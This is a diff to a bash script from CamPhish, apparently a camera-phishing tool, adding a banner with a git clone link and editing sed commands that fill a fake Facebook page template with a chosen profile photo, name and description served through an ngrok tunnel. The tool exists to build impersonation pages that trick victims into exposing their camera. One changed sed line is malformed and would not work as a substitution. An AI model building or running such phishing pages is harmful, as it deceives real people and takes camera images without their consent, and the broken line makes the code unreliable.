@@ -15,6 +15,7 @@ banner() {
 
     printf " \e[1;77m Autor original: www.techchip.net \e[0m \n"
     printf " \e[1;77m Editado por: Darling Buenaño y Carlos Almeida \e[0m \n\n"
+	printf " \e[1;77m Repositorio de github: git clone https://github.com/DarlynYami05/CamPhish.git \e[0m \n\n"
 }
 
 dependencies() {
@@ -225,7 +226,7 @@ payload_ngrok() {
     if [[ $option_tem -eq 1 ]]; then
         sed 's+foto_perfil_facebook+'$foto_perfil_facebook'+g' templates/facebook/facebook_t.html > templates/facebook/facebook.html
         sed -i 's+nombre_usuario_facebook+'$nombre_usuario_facebook'+g' templates/facebook/facebook.html
-        sed -i 's+descripcion_facebook+'$descripcion_facebook'+g' templates/facebook/facebook.html
+        sed -i '.*+descripcion_facebook+'$descripcion_facebook'+g' templates/facebook/facebook.html
         sed -i 's+foto_publicacion_facebook+'$foto_publicacion_facebook'+g' templates/facebook/facebook.html
 
     elif [[ $option_tem -eq 4 ]]; then
